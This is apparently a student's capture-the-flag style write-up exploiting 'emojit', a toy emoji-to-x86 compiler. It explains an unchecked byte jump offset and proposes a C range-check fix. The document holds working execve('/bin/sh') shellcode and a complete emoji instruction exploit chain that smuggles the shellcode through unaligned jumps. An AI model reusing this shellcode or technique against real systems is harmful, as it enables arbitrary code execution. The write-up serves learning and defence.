# PCS final -- `emojit`

### Anders Holst (`sortraev`, `wlc376`)

#### Status of hand-in

I manage to identify sufficiently many bugs in `emojit` to design a successfully
`sh`-popping sequence of emojinstructions. I also present a solution to fix the
particular bug I found.

## Source-level reverse engineering

The program is a compiler from a language of emojis to a subset of x86 where all
instructions are 5 bytes long. For one of the instructions, the 5-byte length is
achieved with `nop` padding, and for the jump (pseudo-)instructions, some extra
instructions are inserted as "infinite loop protection" -- the important point
is that all emojinstructions are compiled into 5-byte (groups of) instructions.

Up to 799 emojinstructions are read from a file using `read_program()`, after
which each emojinstruction is compiled.

#### Compiling emojinstructions

The source code consists of a number of `#define`s of emojinstructions and a
function `void compile_instruction(char *emoji, char *out, int ins_num)`.

In the following I describe the __expected__ mappings from emojinstructions to
compiled x86. Assume `n` is a 32-bit immediate value, `A` and `B` are literals,
and `_` means any immediate value or char literal.

* 💨 (DASH)
```
💨(A, n) -> mov eax, n
💨(B, n) -> mov ebx, n
```

* 👆 (POINT_UP)
```
👆(_, n) -> add eax, n
```

* 👇 (POINT_DOWN)
```
👇(_, n) -> sub eax, n
```

* 👏 (CLAPPING_HANDS)
```
👏 -> add ax, bx; nop; nop; nop
```

* ♎ (LIBRA)
```
♎(A, n) -> cmp eax, n
♎(_, _) -> compilation error!
```

* 🔙 (BACK)

Assume `m` is the least significant byte of `n`.
```
🔙(A, n) -> mov eax, [r12 + m]
🔙(_, n) -> mov ebx, [r12 + m]
```

* 🔜 (SOON)

Assume `m` is the least significant byte of `n`.
```
🔜(A, n) -> mov [r12 + m], eax
🔜(_, n) -> mov [r12 + m], ebx
```

* 🎯 (DIRECT_HIT)
```
🎯 -> ret
```

---

For the three jumping emojinstructions, assume `k = ((n - instrno - 1) * 5)`,
where `instrno` is the zero-indexed number of the given emojinstructions. For
all of these emojinstructions, the source code __implicitly__ assumes `-24 <= n
<= 26`, since they all compile to jump instructions with *byte* offsets (this
constitutes the vulnerability in the program; see next section).

* 🏃 (RUNNER)

Unconditional jump to instruction `#n` (zero-indexed).
```
🏃 n -> jmp k
```

* 👍 (THUMBS_UP)

Jump to instruction `#n` (zero-indexed) if zero flag = 1.
```
👍(n) -> jz k 
```

* 👎 (THUMBS_DOWN)

Jump to instruction `#n` (zero-indexed) if zero flag = 0.
```
👎(n) -> jnz k
```

#### Parsing integers

I won't go into detail with `parse_int()` except to say that it parses signed
32-bit integers. Actually, it fails in one case: it cannot parse the number
`-2147483648 == -2**31` (`INT32_MIN`); however, this is not a source of
vulnerability in the program.

In fact, aside from the bug with `INT32_MIN`, there are no bugs in
`parse_int()`. As we shall see later, the error is in the use of `parse_int()`.



## Vulnerabilities

There is a vulnerability in the way jump offsets are parsed for the three jump
emojinstructions, RUNNER, THUMBS_UP, and THUMBS_DOWN. Note that:

* 1) all three emojinstructions compile into jumps with signed *byte* offsets;
* 2) all three emojinstructions take a jump offset measured in number of lines;
    and
* 3) all emojinstructions are 5 bytes long.

Combined this implies that the jump offset passed to an emojinstruction should
be within the inclusive range `-24 <= n <= 26`, since otherwise the offset
computed by the formular `k = ((n - instrno - 1) * 5)` can result in a number
that is not a multiple of 5 when it is cast from `int` to `char`.

## Exploit plan

The vulnerability can be used to jump to the middle of an instruction and
execute instructions outside of the target subset of instructions. In fact,
because we can place our own 32 bit immediate values in eg. the DASH and
POINT_UP instructions, we can obtain arbitrary code execution so long as we can
pack our exploit into the immediate fields. We can even construct "chains" of
unaligned instructions using 2-byte jump instructions.

I plan to use this vulnerability to construct a sequence of emojis which jumps
to the middle of an emojinstruction and sets up an `execve` of `/bin/sh`.

I will attempt to build the below shellcode:

```asm
 0:	b8 2f 2f 73 68   mov    eax, 0x68732f2f
 5:	bb 2f 62 69 6e   mov    ebx, 0x6e69622f
 a:	48 c1 e0 20      shl    rax, 32
 e:	48 01 d8         add    rax, rbx
11:	31 f6            xor    esi, esi
13:	56               push   rsi
14:	50               push   rax
15:	54               push   rsp
16:	5f               pop    rdi
17:	6a 3b            push   59
19:	58               pop    rax
1a:	99               cdq
1b:	0f 05            syscall
```

Note that the first two instructions each require 5 bytes -- this is ok, because
we happen to have `mov eax, imm` and `mov ebx, imm` in the target subset of
instructions. Everything else should be able to fit in emojinstruction immediate
value fields.

Also, please note that we are *not* restricted to writing shellcode without NULL
bytes. This for example means that we *are* allowed to easily null-terminate the
`/bin/sh` string with a null byte in the `mov eax` instruction, but I simply
re-use this piece of code to save myself some time rewriting it.

I write a small Python script to help compute the correct arguments to the
RUNNER emojinstruction which will let me jump wherever I want:

```python
import sys, numpy as np
if __name__ == "__main__" and len(sys.argv) >= 3:
    cur  = int(sys.argv[1]) # current ins number
    offs = int(sys.argv[2]) # jump offset in bytes (including current ins)
    x   = ((np.arange(256) - cur) * 5) & 255
    res = np.argwhere(x == offs).flat[0]
    print(f"to jump {offs} bytes from ins #{cur}, use RUNNER {res}")
```

Below is the final, full emojinstruction stream with above shellcode
interleaved:

```
# first, we use 💨(A, 0x68732f2f) to get: `mov eax, 0x68732f2f`
💨(A, 1752379183)

# next, 💨(B, 0x6e69622f) gets us `mov ebx, 0x6e69622f`
💨(B, 1852400175)

# jmp from ins #2 + 6 bytes forward
🏃 208
# by jumping to second byte of 💨(A, 0x20e0c148), we get `shl rax, 32`
💨(B, 551600456)


# jmp from ins #4) + 9 bytes forward
🏃 57
# by jumping to last byte of 💨(A, 0x48484848) followed by 👏, we get:
# add rax, rbx        ; 48 01 d8
# nop, nop, nop       ; 90 90 90
💨(A, 1212696648)
👏(_, 0)


# jmp from ins #7 + 6 bytes forward
🏃 213
# by jumping to second byte of 💨(A, 0x5056f631), we get:
# xor esi, esi        ; 31 f6
# push rsi            ; 56
# push rax            ; 50
💨(A, 1347876401)

# jmp from ins #9) + 6 bytes forward
🏃 215
# by jumping to second byte of 💨(A, 0x3b6af554), we get:
# push rsp            ; 54
# pop rdi             ; 5f
# push byte 59        ; 6a 3b
💨(A, 996826964)

# jmp from ins #11 + 6 bytes forward
🏃 217
# by jumping to second byte of 💨(A, 0x050f9958), we get:
# pop rax             ; 58
# cdq                 ; 99
# syscall             ; 0f 05
💨(A, 84908376)
```

## How to fix the compiler

To prevent the bug from occuring, we can insert a simple check of whether the
given argument to RUNNER, THUMBS_UP, and THUMBS_DOWN is within the allowed range
for jump offsets:

```c
...
  else if (strncmp(cmd, RUNNER, sizeof(RUNNER) - 1) == 0) {
    *(int*)out = 0xebc301e2;
    int32_t jmp_line_offs = parse_int(cmd + sizeof(RUNNER)) - instrno;
#if FIX_UNALIGNED_JUMP_BUG
    if (jmp_line_offs < -24 || jmp_line_offs > 26)
      die("invalid line offset in arg to RUNNER (should be in range -24..26)");
#endif
    out[4] = (char) (jmp_line_offs - 1) * 5;
  }
...
```

and similarly for THUMBS_UP and THUMBS_DOWN. Alternatively, we could check that
the computed jump is a multiple of 5 and within the range of a char (since, as
mentiond, we use byte offset jump instructions).
